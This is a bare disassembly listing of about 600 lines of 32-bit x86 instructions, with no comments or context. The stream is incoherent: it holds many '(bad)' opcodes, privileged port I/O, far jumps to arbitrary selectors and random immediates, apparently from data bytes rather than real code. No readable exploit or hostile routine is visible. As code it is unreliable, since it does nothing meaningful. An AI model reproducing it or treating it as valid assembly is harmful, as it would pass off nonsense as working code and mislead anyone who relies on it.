  40dafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dafd:	fsubr  st,st(5)
  40daff:	mov    al,ds:0xe71e8f0d
  40db04:	pop    eax
  40db05:	xchg   ebp,eax
  40db06:	test   DWORD PTR [edx-0x28],ebx
  40db09:	outs   dx,BYTE PTR ds:[esi]
  40db0a:	mov    ecx,0xc1febc7a
  40db0f:	scas   eax,DWORD PTR es:[edi]
  40db10:	sbb    al,0x46
  40db12:	pop    edx
  40db13:	or     eax,0xe86936ad
  40db18:	push   esi
  40db19:	into   
  40db1a:	push   ebp
  40db1b:	xor    dx,WORD PTR [eax-0x79]
  40db1f:	div    BYTE PTR [edi]
  40db21:	test   eax,0x8280c57a
  40db26:	add    DWORD PTR [ebp-0x55],esp
  40db29:	sbb    BYTE PTR [edx+edx*4],bl
  40db2c:	test   eax,0x20b1bd2b
  40db31:	je     0x40db13
  40db33:	cwde   
  40db34:	cs cmp eax,0x870542
  40db3a:	sbb    BYTE PTR [edx+0x47],ch
  40db3d:	jg     0x40db9a
  40db3f:	jge    0x40db6f
  40db41:	mov    cl,0xe8
  40db43:	jnp    0x40db23
  40db45:	setne  BYTE PTR [ecx-0x5713e474]
  40db4c:	pop    ss
  40db4d:	loope  0x40dba0
  40db4f:	repz dec ebx
  40db51:	and    BYTE PTR [eax+0x34],bl
  40db54:	(bad)  
  40db55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db56:	and    cl,cl
  40db58:	add    DWORD PTR [ebx],ebx
  40db5a:	inc    edi
  40db5b:	std    
  40db5c:	es es mov bh,0xd8
  40db60:	lods   eax,DWORD PTR ds:[esi]
  40db61:	push   cs
  40db62:	out    0x7d,eax
  40db64:	jp     0x40db30
  40db66:	popf   
  40db67:	cmp    esi,ebp
  40db69:	fmul   st,st(5)
  40db6b:	push   ecx
  40db6c:	sbb    cl,bh
  40db6e:	sub    al,0x57
  40db70:	loope  0x40dbb6
  40db72:	adc    DWORD PTR [ebp-0x7e633ad3],0xcdf3c5ab
  40db7c:	(bad)  
  40db7d:	sbb    BYTE PTR [esi+0x47],cl
  40db80:	sub    ebx,DWORD PTR [esi-0x6fecb756]
  40db86:	pushf  
  40db87:	pop    edx
  40db88:	jb     0x40dbdb
  40db8a:	loopne 0x40db0d
  40db8c:	pop    edx
  40db8d:	scas   al,BYTE PTR es:[edi]
  40db8e:	out    dx,eax
  40db8f:	lds    edi,FWORD PTR [eax-0x9]
  40db92:	fwait
  40db93:	sub    eax,0x92932e8b
  40db98:	dec    ecx
  40db99:	es test edi,esp
  40db9c:	nop
  40db9d:	(bad)  
  40db9e:	cmp    ecx,DWORD PTR [eax-0x5f]
  40dba1:	pop    es
  40dba2:	lea    ebp,[esi]
  40dba4:	leave  
  40dba5:	add    DWORD PTR [edx+0x17c01496],ebx
  40dbab:	mov    dl,0x9f
  40dbad:	pusha  
  40dbae:	fcom   st(3)
  40dbb0:	shr    ecx,1
  40dbb2:	cmp    BYTE PTR [edx+0x449f4176],dl
  40dbb8:	dec    eax
  40dbb9:	push   edx
  40dbba:	(bad)  
  40dbbc:	adc    eax,0x3a099be8
  40dbc1:	xlat   BYTE PTR ds:[ebx]
  40dbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbc3:	pop    es
  40dbc4:	mov    edi,0x4841b123
  40dbc9:	call   0x5b85:0xe0eb5256
  40dbd0:	jg     0x40dc24
  40dbd2:	fstp   TBYTE PTR [edi+0x777fc281]
  40dbd8:	js     0x40db64
  40dbda:	aaa    
  40dbdb:	hlt    
  40dbdc:	fucomi st,st(2)
  40dbde:	push   esi
  40dbdf:	jmpw   0xdfac
  40dbe3:	fwait
  40dbe4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbe5:	pop    ecx
  40dbe6:	js     0x40dbce
  40dbe8:	fcmove st,st(0)
  40dbea:	push   es
  40dbeb:	jae    0x40dbf0
  40dbed:	(bad)  
  40dbee:	xor    DWORD PTR [ecx+0x7918fcff],edx
  40dbf4:	or     ebp,DWORD PTR [ecx-0x20]
  40dbf7:	in     al,dx
  40dbf8:	bound  esi,QWORD PTR [esi+eiz*2-0x2aa3586b]
  40dbff:	test   al,0x5d
  40dc01:	adc    BYTE PTR [esi-0x85ecd9],cl
  40dc07:	sub    al,0x92
  40dc09:	and    esi,DWORD PTR [edx-0x24cabb6]
  40dc0f:	arpl   WORD PTR [ecx],sp
  40dc11:	lods   al,BYTE PTR ds:[esi]
  40dc12:	sub    edx,ebp
  40dc14:	test   eax,0xb55693c6
  40dc19:	xor    BYTE PTR [edi-0x49885dd4],bl
  40dc1f:	in     eax,dx
  40dc20:	(bad)  
  40dc22:	in     eax,0x5a
  40dc24:	fist   DWORD PTR [edx+0x6]
  40dc27:	pop    esp
  40dc28:	call   0xf84:0x2c2ff330
  40dc2f:	pop    es
  40dc30:	stc    
  40dc31:	push   ecx
  40dc32:	cmp    al,0xa7
  40dc34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc35:	(bad)  
  40dc36:	cmp    ecx,DWORD PTR [esi-0x4d]
  40dc39:	lods   eax,DWORD PTR ds:[esi]
  40dc3a:	rol    BYTE PTR [esp+edx*1+0x7150735d],1
  40dc41:	push   edi
  40dc42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc43:	lods   eax,DWORD PTR ds:[esi]
  40dc44:	pop    ds
  40dc45:	aas    
  40dc46:	fimul  WORD PTR [esi-0x56b15e1a]
  40dc4c:	sbb    DWORD PTR ss:[edi],ecx
  40dc4f:	push   ebx
  40dc50:	jb     0x40dc4c
  40dc52:	gs in  al,dx
  40dc54:	icebp  
  40dc55:	test   al,0xb3
  40dc57:	in     eax,0x89
  40dc59:	fwait
  40dc5a:	dec    ebp
  40dc5b:	arpl   WORD PTR [edx+0x11],bp
  40dc5e:	sbb    BYTE PTR [esi],dh
  40dc60:	pop    ds
  40dc61:	ja     0x40dc0e
  40dc63:	ins    BYTE PTR es:[edi],dx
  40dc64:	mov    ch,0x3d
  40dc66:	vshufps xmm6,xmm3,XMMWORD PTR [ebx+eiz*4+0x58],0x18
  40dc6d:	jno    0x40dcd2
  40dc6f:	(bad)  
  40dc70:	xchg   DWORD PTR [eax],ebx
  40dc72:	loopne 0x40dc33
  40dc74:	in     al,0x42
  40dc76:	lds    eax,FWORD PTR [ecx]
  40dc78:	fisttp WORD PTR [ebx+0x42]
  40dc7b:	xchg   BYTE PTR [edi-0x37],ah
  40dc7e:	addr16 inc ebp
  40dc80:	inc    esi
  40dc81:	mov    ebp,0x984ac89c
  40dc86:	mov    eax,ds:0x62efff51
  40dc8b:	mov    ch,bh
  40dc8d:	adc    DWORD PTR [ecx],edi
  40dc8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc90:	fs mov al,0x97
  40dc93:	dec    esp
  40dc94:	add    ecx,ebp
  40dc96:	sub    al,0x73
  40dc98:	call   0x9d84f457
  40dc9d:	leave  
  40dc9e:	adc    ax,0x7c47
  40dca2:	or     bl,BYTE PTR [edi+ecx*4+0x51]
  40dca6:	xor    cl,ah
  40dca8:	into   
  40dca9:	inc    esi
  40dcaa:	test   DWORD PTR [edi-0x5a504e0],0xddf95af2
  40dcb4:	dec    esp
  40dcb5:	stos   BYTE PTR es:[edi],al
  40dcb6:	in     eax,0x75
  40dcb8:	adc    al,0x2d
  40dcba:	mov    edi,DWORD PTR [ecx]
  40dcbc:	xor    BYTE PTR [edx],al
  40dcbe:	jle    0x40dc74
  40dcc0:	repz jbe 0x40dcee
  40dcc3:	outs   dx,BYTE PTR gs:[esi]
  40dcc5:	jns    0x40dd1e
  40dcc7:	dec    esi
  40dcc8:	xchg   esi,eax
  40dcc9:	int3   
  40dcca:	lahf   
  40dccb:	mov    eax,0xfdb11f62
  40dcd0:	out    0xb7,al
  40dcd2:	cs (bad) 
  40dcd4:	xor    esi,DWORD PTR [edx]
  40dcd6:	bound  edx,QWORD PTR [ebp-0x192e511b]
  40dcdc:	loope  0x40dd05
  40dcde:	add    al,0x1d
  40dce0:	(bad)  
  40dce1:	sbb    al,0x32
  40dce3:	fsubrp st(1),st
  40dce5:	mov    dh,BYTE PTR [ebp+0x52]
  40dce8:	out    dx,eax
  40dce9:	pusha  
  40dcea:	ins    DWORD PTR es:[edi],dx
  40dceb:	loopne 0x40dd0f
  40dced:	jno    0x40dcbf
  40dcef:	push   ds
  40dcf0:	sbb    eax,0x71ba711
  40dcf5:	adc    ebp,DWORD PTR [eax-0x4d5b7e35]
  40dcfb:	push   eax
  40dcfc:	test   BYTE PTR [edi+0x454105a1],dl
  40dd02:	jbe    0x40dd5e
  40dd04:	clc    
  40dd05:	loope  0x40dd0f
  40dd07:	cmp    ebx,DWORD PTR [esi-0x3]
  40dd0a:	mov    esi,0xa23b508f
  40dd0f:	mov    BYTE PTR [ebp+ebx*8+0x770159be],ch
  40dd16:	jnp    0x40dd34
  40dd18:	add    BYTE PTR [esi+esi*1],cl
  40dd1b:	adc    ch,BYTE PTR [edi-0x34812fad]
  40dd21:	mov    cl,0xbc
  40dd23:	inc    esp
  40dd24:	(bad)  
  40dd25:	adc    al,0x14
  40dd27:	clc    
  40dd28:	push   0x6df2c17c
  40dd2d:	mov    ds:0x34d6e4ed,al
  40dd32:	test   DWORD PTR [eax+0x2],0x39f7f791
  40dd39:	mov    bh,ah
  40dd3b:	inc    esp
  40dd3c:	mov    esi,0x311ea5f3
  40dd41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd42:	push   es
  40dd43:	add    BYTE PTR [edi-0x4e],bl
  40dd46:	mov    dl,0x48
  40dd48:	popf   
  40dd49:	nop
  40dd4a:	ret    
  40dd4b:	mov    eax,0xad794172
  40dd50:	jecxz  0x40dda1
  40dd52:	xlat   BYTE PTR ds:[ebx]
  40dd53:	js     0x40dd7f
  40dd55:	test   DWORD PTR [edx+0x5d4c4915],eax
  40dd5b:	mov    dl,0xf5
  40dd5d:	call   0xc50e1b53
  40dd62:	leave  
  40dd63:	retf   
  40dd64:	stos   BYTE PTR es:[edi],al
  40dd65:	xchg   esi,eax
  40dd66:	pop    edi
  40dd67:	xchg   bp,ax
  40dd69:	xor    DWORD PTR [edi],esp
  40dd6b:	xor    eax,DWORD PTR [ebx+ebx*4+0x5e]
  40dd6f:	mov    esp,DWORD PTR [ebx-0x14]
  40dd72:	mov    dl,0xc2
  40dd74:	push   ecx
  40dd75:	sub    DWORD PTR [eax+0xa],ecx
  40dd78:	push   eax
  40dd79:	sti    
  40dd7a:	imul   ebx,DWORD PTR [ebp-0x1c7ca203],0x1abf1c4f
  40dd84:	dec    esp
  40dd85:	(bad)  
  40dd86:	pop    edx
  40dd87:	mov    al,0xb4
  40dd89:	inc    esi
  40dd8a:	sub    esi,DWORD PTR [esi]
  40dd8c:	jge    0x40ddf9
  40dd8e:	add    al,0x22
  40dd90:	cwde   
  40dd91:	in     eax,0x50
  40dd93:	lock xor BYTE PTR [ecx+0x12],dl
  40dd97:	inc    ecx
  40dd98:	fisubr WORD PTR [ecx+0x1ad30612]
  40dd9e:	or     eax,0x63da1da8
  40dda3:	(bad)  
  40dda4:	sub    DWORD PTR [ebx-0x76d6ce6a],ebp
  40ddaa:	mov    dl,0x8
  40ddac:	sub    cl,BYTE PTR [edi-0x7f]
  40ddaf:	call   0x46533a58
  40ddb4:	shl    BYTE PTR [esi-0x27],0xde
  40ddb8:	jnp    0x40de13
  40ddba:	add    eax,0x6bde2bba
  40ddbf:	popf   
  40ddc0:	out    0xd9,al
  40ddc2:	sbb    ecx,DWORD PTR [ecx-0x5b39137e]
  40ddc8:	stc    
  40ddc9:	into   
  40ddca:	xchg   edi,eax
  40ddcb:	xchg   esi,eax
  40ddcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddcd:	bound  ecx,QWORD PTR [edx]
  40ddcf:	aas    
  40ddd0:	test   BYTE PTR [eax+edx*8-0x1d3101da],ah
  40ddd7:	mov    ds:0xd0421981,eax
  40dddc:	xor    eax,0xf560d927
  40dde1:	xor    DWORD PTR [edx],0x4939b109
  40dde7:	(bad)  
  40dde8:	or     al,0x3b
  40ddea:	es xchg esp,eax
  40ddec:	jbe    0x40de33
  40ddee:	inc    ebp
  40ddef:	in     al,dx
  40ddf0:	test   eax,0xbee3639
  40ddf5:	and    eax,0xcc29083c
  40ddfa:	cmp    BYTE PTR [edx+0x2a8184f],bl
  40de00:	add    ch,ch
  40de02:	(bad)  
  40de03:	xlat   BYTE PTR ds:[ebx]
  40de04:	out    dx,al
  40de05:	into   
  40de06:	(bad)  
  40de07:	daa    
  40de08:	lahf   
  40de09:	dec    ebx
  40de0a:	fisubr DWORD PTR [eax+ebp*1+0x4e]
  40de0e:	pop    edi
  40de0f:	repz jmp 0x40de27
  40de12:	sahf   
  40de13:	(bad)  
  40de14:	push   edx
  40de15:	ret    
  40de16:	ror    ch,1
  40de18:	push   0x1870721d
  40de1d:	push   ss
  40de1e:	(bad)  
  40de1f:	loop   0x40de93
  40de21:	inc    eax
  40de22:	xchg   DWORD PTR [esi+0x41ef4233],ebp
  40de28:	fcomp  DWORD PTR [eax+ebx*2+0x58]
  40de2c:	shl    ch,0xf8
  40de2f:	inc    edx
  40de30:	repnz pop edx
  40de32:	(bad)  
  40de35:	das    
  40de36:	fldenv [ebx]
  40de38:	mov    dh,0xba
  40de3a:	in     al,0x40
  40de3c:	sbb    eax,0x8280dcd1
  40de41:	and    DWORD PTR [edi],ecx
  40de43:	push   0x2065d01c
  40de48:	fisubr WORD PTR [esi+0x74]
  40de4b:	pop    ds
  40de4c:	pop    ebx
  40de4d:	les    esp,FWORD PTR [edx-0x133d43ad]
  40de53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de54:	inc    edi
  40de55:	test   BYTE PTR [esi-0x60],ah
  40de58:	mov    ch,0x45
  40de5a:	mov    DWORD PTR [edx+0x10],eax
  40de5d:	pop    ebx
  40de5e:	fcomp  DWORD PTR [esi-0x39]
  40de61:	sub    bl,0xaf
  40de64:	lods   al,BYTE PTR ds:[esi]
  40de65:	push   ebx
  40de66:	cli    
  40de67:	nop
  40de68:	jb     0x40deb4
  40de6a:	ins    DWORD PTR es:[edi],dx
  40de6b:	sbb    ebp,DWORD PTR [esi-0x1]
  40de6e:	lods   al,BYTE PTR ds:[esi]
  40de6f:	sbb    BYTE PTR [esi+0x7319101],0xb
  40de76:	mov    edi,0x8e08bc79
  40de7b:	jmp    0x1874edf
  40de80:	test   BYTE PTR [eax-0xfc28091],bh
  40de86:	mov    edi,0x2b1d8c1f
  40de8b:	sub    DWORD PTR [edi],ebp
  40de8d:	jmp    0x40de5d
  40de8f:	mov    ebp,0x38dba243
  40de94:	inc    ebp
  40de95:	cwde   
  40de96:	fdiv   DWORD PTR [edx-0x431e4007]
  40de9c:	aaa    
  40de9d:	hlt    
  40de9e:	arpl   WORD PTR [ebx-0x8222701],cx
  40dea4:	jae    0x40de5b
  40dea6:	xchg   esi,eax
  40dea7:	ins    DWORD PTR es:[edi],dx
  40dea8:	js     0x40debb
  40deaa:	sbb    eax,0x32bd6452
  40deaf:	mov    esp,0x60d3432a
  40deb4:	icebp  
  40deb5:	mov    esp,0x20252566
  40deba:	mov    dl,0xaf
  40debc:	rcl    BYTE PTR [ebx*8-0x53e68733],cl
  40dec3:	xchg   esp,eax
  40dec4:	(bad)  
  40dec5:	pop    eax
  40dec6:	mov    esi,0x987b2f8c
  40decb:	mov    ebp,DWORD PTR [esi+0x6ae75c26]
  40ded1:	ja     0x40deed
  40ded3:	jbe    0x40df49
  40ded5:	pushf  
  40ded6:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ded8:	sbb    ah,BYTE PTR [eax+ecx*2+0x541d94f0]
  40dedf:	xor    dl,dl
  40dee1:	rep outs dx,DWORD PTR ds:[esi]
  40dee3:	add    bl,bl
  40dee5:	lock lock push ebp
  40dee8:	outs   dx,DWORD PTR ds:[esi]
  40dee9:	sub    DWORD PTR [edi+edx*4+0x3bb1d76e],edi
  40def0:	xor    DWORD PTR [esi-0x72],edi
  40def3:	out    dx,eax
  40def4:	add    edi,edi
  40def6:	dec    eax
  40def7:	int3   
  40def8:	mov    cl,0x47
  40defa:	xor    eax,DWORD PTR [eax]
  40defc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40defd:	lods   al,BYTE PTR ds:[esi]
  40defe:	jg     0x40df25
  40df00:	dec    esi
  40df01:	push   0xf12f9309
  40df06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df07:	ins    DWORD PTR es:[edi],dx
  40df08:	mov    esp,0xf73c08cf
  40df0d:	mov    ah,0x52
  40df0f:	pop    edi
  40df10:	aaa    
  40df11:	add    esp,ebx
  40df13:	push   cs
  40df14:	mov    eax,0x4ceb54c8
  40df19:	sar    BYTE PTR [ebx-0x17],0x84
  40df1d:	xchg   esi,eax
  40df1e:	test   bh,cl
  40df20:	jmp    0xdc33:0xb01435a0
  40df27:	mov    ds:0x8316d23a,eax
  40df2c:	aad    0x4e
  40df2e:	sub    eax,0x3b6a6067
  40df33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df34:	daa    
  40df35:	pop    edx
  40df36:	add    bl,dh
  40df38:	or     ch,ah
  40df3a:	(bad)  
  40df3b:	xor    ebx,edi
  40df3d:	xor    bh,BYTE PTR [esp+edi*1]
  40df40:	xchg   DWORD PTR [ebx+0x6d],edx
  40df43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df44:	pop    esp
  40df45:	stos   DWORD PTR es:[edi],eax
  40df46:	sahf   
  40df47:	dec    esp
  40df48:	adc    dh,BYTE PTR [eax+0x139e6351]
  40df4e:	jge    0x40df8f
  40df50:	mov    dh,0xa0
  40df52:	sub    DWORD PTR [ebx],eax
  40df54:	sub    bh,ch
  40df56:	xor    cl,BYTE PTR [ecx+0x21]
  40df59:	mov    al,0x1a
  40df5b:	mov    dl,0x38
  40df5d:	push   edx
  40df5e:	sub    BYTE PTR [ebp-0x8535f56],cl
  40df64:	xlat   BYTE PTR ds:[ebx]
  40df65:	imul   esi,DWORD PTR [esp+edx*2+0x49],0x4c656394
  40df6d:	sub    ebp,DWORD PTR [ecx]
  40df6f:	or     DWORD PTR [ebx],esi
  40df71:	jae    0x40dfc9
  40df73:	jbe    0x40df79
  40df75:	sbb    edi,DWORD PTR [edi]
  40df77:	xor    eax,0xe3d3a06f
  40df7c:	xor    ah,BYTE PTR [ebp+0x671609e1]
  40df82:	mov    al,ds:0x5e577712
  40df87:	mov    ds:0x29194335,eax
  40df8c:	outs   dx,BYTE PTR ds:[esi]
  40df8d:	inc    ebp
  40df8e:	in     al,0x5
  40df90:	neg    BYTE PTR [eax]
  40df92:	push   es
  40df93:	and    ah,BYTE PTR [ebx+0x1c9096b8]
  40df99:	mov    DWORD PTR ds:0x8a4fba07,ecx
  40df9f:	mov    eax,0x8c5ad026
  40dfa4:	test   DWORD PTR [edi+0x488622fb],eax
  40dfaa:	sbb    al,0x1b
  40dfac:	push   ds
  40dfad:	inc    esp
  40dfae:	adc    eax,0x2387268
  40dfb3:	push   es
  40dfb4:	in     eax,0x7e
  40dfb6:	push   ebx
  40dfb7:	dec    ebx
  40dfb8:	loope  0x40df94
  40dfba:	push   edi
  40dfbb:	mov    al,0x85
  40dfbd:	xor    BYTE PTR [ebx],al
  40dfbf:	sub    edx,DWORD PTR ds:0x1486e0ce
  40dfc5:	mov    al,0xf
  40dfc7:	rol    BYTE PTR [ebp-0x6],1
  40dfca:	popf   
  40dfcb:	and    eax,0x6dbd1d57
  40dfd0:	mov    al,ds:0x2360dfb8
  40dfd5:	fnstsw WORD PTR [edi-0x16ec79fc]
  40dfdb:	jmp    0x4b5e:0xa576f198
  40dfe2:	psrlq  mm2,QWORD PTR [edi+0x20]
  40dfe6:	push   0xec8ef791
  40dfeb:	shl    ch,1
  40dfed:	adc    cl,BYTE PTR [eax-0xc]
  40dff0:	jnp    0x40df97
  40dff2:	out    0xb8,eax
  40dff4:	ds pop eax
  40dff6:	jns    0x40e010
  40dff8:	xor    bh,BYTE PTR [esi+0x5b]
  40dffb:	push   esi
  40dffc:	(bad)  
  40dffd:	jnp    0x40df98
  40dfff:	cmp    bh,BYTE PTR [ecx-0x79]
  40e002:	adc    DWORD PTR [ebx-0x7e851cb1],ebx
  40e008:	je     0x40dfab
  40e00a:	jmp    0xc955:0x99ec6a85
  40e011:	mov    ebx,edi
  40e013:	jp     0x40dfb3
  40e015:	mov    DWORD PTR [edi+ebp*8],edi
  40e018:	jns    0x40e02d
  40e01a:	mov    eax,ds:0x1b5722a1
  40e01f:	dec    ebx
  40e020:	pop    esi
  40e021:	push   0xfffffff8
  40e023:	add    al,0x4d
  40e025:	inc    ebx
  40e026:	xor    BYTE PTR [esi+0x64af719f],ch
  40e02c:	into   
  40e02d:	sahf   
  40e02e:	push   0xffffff9d
  40e030:	in     eax,0x8
  40e032:	(bad)  
  40e033:	push   esi
  40e034:	push   esp
  40e035:	mov    dh,0x71
  40e037:	in     eax,0x8c
  40e039:	jl     0x40e080
  40e03b:	sbb    eax,0x116a8fcb
  40e040:	daa    
  40e041:	push   esi
  40e042:	ins    DWORD PTR es:[edi],dx
  40e043:	and    al,0xfb
  40e045:	sub    ch,BYTE PTR ds:0xe8c9356d
  40e04b:	jns    0x40dff0
  40e04d:	add    ebp,DWORD PTR [esi-0x3289d492]
  40e053:	xor    ebx,esp
  40e055:	cmp    dh,dl
  40e057:	and    bh,BYTE PTR [edx-0x21]
  40e05a:	dec    eax
  40e05b:	add    eax,0x70f86c28
  40e060:	pop    edx
  40e061:	inc    edi
  40e062:	imul   ebp,DWORD PTR [ecx+0x2db11c6a],0xb3cf49c4
  40e06c:	scas   eax,DWORD PTR es:[edi]
  40e06d:	neg    BYTE PTR [esi]
  40e06f:	loope  0x40e059
  40e071:	push   ebp
  40e072:	lahf   
  40e073:	xor    DWORD PTR [eax*4+0x4b45d91e],edx
  40e07a:	dec    edx
  40e07b:	mov    esp,0xef3d11a
  40e080:	jae    0x40e0ef
  40e082:	call   0xd28:0xb5e6a4c9
  40e089:	outs   dx,BYTE PTR ds:[esi]
  40e08a:	lahf   
  40e08b:	ret    
  40e08c:	retf   0x6446
  40e08f:	xor    al,al
  40e091:	adc    cl,dl
  40e093:	or     DWORD PTR [ebx],ebx
  40e095:	jbe    0x40e0ef
  40e097:	cmp    ah,BYTE PTR [edx+0x11]
  40e09a:	mov    bh,0x3d
  40e09c:	inc    ebx
  40e09d:	push   esp
  40e09e:	shl    esi,1
  40e0a0:	and    ebx,DWORD PTR [edi+0x65a884df]
  40e0a6:	mov    ds:0x8802402b,eax
  40e0ab:	jle    0x40e0d1
  40e0ad:	shl    BYTE PTR ss:[eax+0x689f2f63],0xf
  40e0b5:	sahf   
  40e0b6:	sub    ebp,edx
  40e0b8:	scas   eax,DWORD PTR es:[edi]
  40e0b9:	xor    al,0x78
  40e0bb:	xlat   BYTE PTR ds:[ebx]
  40e0bc:	ret    
  40e0bd:	dec    esp
  40e0be:	push   ss
  40e0bf:	sub    bl,cl
  40e0c1:	sub    BYTE PTR [eax],0x7a
  40e0c4:	xor    al,0xee
  40e0c6:	add    al,0x7d
  40e0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0c9:	js     0x40e088
  40e0cb:	les    ebp,FWORD PTR [ebx-0x2b]
  40e0ce:	in     al,dx
  40e0cf:	cs aas 
  40e0d1:	retf   
  40e0d2:	add    edi,0xf8ac2882
  40e0d8:	test   al,0x87
  40e0da:	lock shr BYTE PTR [edi],1
  40e0dd:	lahf   
  40e0de:	cwde   
  40e0df:	out    dx,eax
  40e0e0:	jbe    0x40e0e6
  40e0e2:	inc    ebp
  40e0e3:	pop    ebx
  40e0e4:	sbb    BYTE PTR [ecx-0x6489e70f],ah
  40e0ea:	sbb    esp,DWORD PTR [eax]
  40e0ec:	test   DWORD PTR [eax+edi*1+0x49138c5b],esp
  40e0f3:	test   DWORD PTR [edi-0x1fb4548e],0x871e013f
  40e0fd:	and    ebp,esi
  40e0ff:	fs inc edi
  40e101:	push   ss
  40e102:	test   ebp,0x5fa06e6f
  40e108:	fbld   TBYTE PTR [ebx+edi*1+0x1517f0d1]
  40e10f:	lea    eax,[eax+0x57]
  40e112:	cmp    al,dl
  40e114:	sbb    ah,dh
  40e116:	int3   
  40e117:	adc    edx,ebx
  40e119:	xchg   edi,eax
  40e11a:	in     eax,0xc3
  40e11c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e11d:	pop    esi
  40e11e:	clc    
  40e11f:	sub    DWORD PTR [eax-0x5],eax
  40e122:	fabs   
  40e124:	ss fwait
  40e126:	test   al,0x99
  40e128:	scas   al,BYTE PTR es:[edi]
  40e129:	push   ecx
  40e12a:	push   ecx
  40e12b:	jae    0x40e18b
  40e12d:	fcom   QWORD PTR [eax]
  40e12f:	pop    esp
  40e130:	pusha  
  40e131:	out    dx,eax
  40e132:	enter  0x5ec4,0xe5
  40e136:	fisub  WORD PTR [ecx+0x63]
  40e139:	mov    ebp,0xf9c7d376
  40e13e:	gs push ebx
  40e140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e141:	cmc    
  40e142:	jbe    0x40e13b
  40e144:	data16 ins BYTE PTR es:[edi],dx
  40e146:	add    bl,dh
  40e148:	xor    dl,BYTE PTR [ebx]
  40e14a:	xor    ebx,DWORD PTR [ebx-0x214edc87]
  40e150:	ror    DWORD PTR [ebx+0x5a],cl
  40e153:	int    0xeb
  40e155:	scas   eax,DWORD PTR es:[edi]
  40e156:	jecxz  0x40e182
  40e158:	jb     0x40e15d
  40e15a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e15b:	data16 mul BYTE PTR ds:0xdb8f0592
  40e162:	xor    eax,0xafdb719b
  40e167:	inc    edx
  40e168:	mov    edx,0x7af91ac1
  40e16d:	fdiv   DWORD PTR [esi+0x1b]
  40e170:	add    esp,ecx
  40e172:	add    BYTE PTR [edx],bh
  40e174:	and    BYTE PTR [ebx-0x21],cl
  40e177:	dec    eax
  40e178:	sub    eax,ecx
  40e17a:	scas   al,BYTE PTR es:[edi]
  40e17b:	inc    eax
  40e17c:	(bad)  
  40e17d:	fidivr DWORD PTR [edx]
  40e17f:	inc    esp
  40e180:	lods   eax,DWORD PTR ds:[esi]
  40e181:	test   eax,0xb16cd4fc
  40e186:	mov    WORD PTR [ebp+0x1a392515],?
  40e18c:	cmp    al,0x89
  40e18e:	jp     0x40e1a5
  40e190:	mov    esp,0xd5322545
  40e195:	hlt    
  40e196:	mov    dl,0xe3
  40e198:	and    esi,DWORD PTR [edx+0x357f186e]
  40e19e:	nop
  40e19f:	les    esp,FWORD PTR [ebx-0x254c1c75]
  40e1a5:	lds    ecx,FWORD PTR [edx]
  40e1a7:	mov    DWORD PTR [ebx],ebp
  40e1a9:	mov    bh,0xb8
  40e1ab:	mov    esp,0xae01b083
  40e1b0:	aad    0x7b
  40e1b2:	mov    ds:0x697dd388,al
  40e1b7:	ja     0x40e22f
  40e1b9:	test   DWORD PTR ss:[edx],eax
  40e1bc:	sbb    al,0x65
  40e1be:	mov    esp,0x9e411ee3
  40e1c3:	retf   0x66b6
  40e1c6:	and    BYTE PTR [edi+0xd],bl
  40e1c9:	or     eax,0x3812a71c
  40e1ce:	aad    0x87
  40e1d0:	xchg   esi,eax
  40e1d1:	lods   al,BYTE PTR ds:[esi]
  40e1d2:	imul   ecx,DWORD PTR [eax+0x2a999ebd],0x6d
  40e1d9:	sub    eax,0x2e8e07f
  40e1de:	cwde   
  40e1df:	mov    eax,ds:0x8000bc1c
  40e1e4:	std    
  40e1e5:	pop    ecx
  40e1e6:	sbb    DWORD PTR [ebp+0x42ab5dd0],esp
  40e1ec:	in     eax,0xe3
  40e1ee:	ss (bad) 
  40e1f1:	dec    esp
  40e1f2:	ss mov dh,0x95
  40e1f5:	and    eax,0x617fdc21
  40e1fa:	pushf  
  40e1fb:	addr16 jb 0x40e22d
  40e1fe:	sbb    esp,ebp
  40e200:	cmp    eax,0xb0e20205
  40e205:	test   WORD PTR [ebx-0x41],dx
  40e209:	inc    edi
  40e20a:	sbb    BYTE PTR [ecx+edx*8-0x7b],0x1b
  40e20f:	sub    eax,0xb5a75429
  40e214:	sbb    eax,0xa548c092
  40e219:	(bad)  
  40e21a:	iret   
  40e21b:	retf   
  40e21c:	push   ss
  40e21d:	es xchg ebp,eax
  40e21f:	lahf   
  40e220:	mov    esp,0xc3b8eba1
  40e225:	shl    BYTE PTR es:[ecx+ebp*8-0x549ddcd9],1
  40e22d:	dec    ebx
  40e22e:	and    edi,DWORD PTR [edx+0x36]
  40e231:	add    al,0x39
  40e233:	imul   esi,DWORD PTR [edi-0x31816e01],0x9f72c918
  40e23d:	mov    ebx,0xfb241b25
  40e242:	mov    esp,0xc5b83758
  40e247:	pop    es
  40e248:	cmp    al,0x3b
  40e24a:	xchg   esp,eax
  40e24b:	repz adc eax,DWORD PTR [edx-0x7d]
  40e24f:	xor    al,BYTE PTR [ebx]
  40e251:	push   0x9c5ca88a
  40e256:	out    0x3d,al
  40e258:	fucomp st(1)
  40e25a:	mov    cl,0x8
  40e25c:	sub    eax,0xc896575e
  40e261:	adc    BYTE PTR [eax],0xc2
  40e264:	call   0x5ebc9db9
  40e269:	and    ebp,DWORD PTR [edx-0x27d03825]
  40e26f:	and    bl,BYTE PTR [eax-0x61e35a55]
  40e275:	loopne 0x40e247
  40e277:	(bad)  
  40e278:	enter  0xe219,0x59
  40e27c:	mov    ch,0x1c
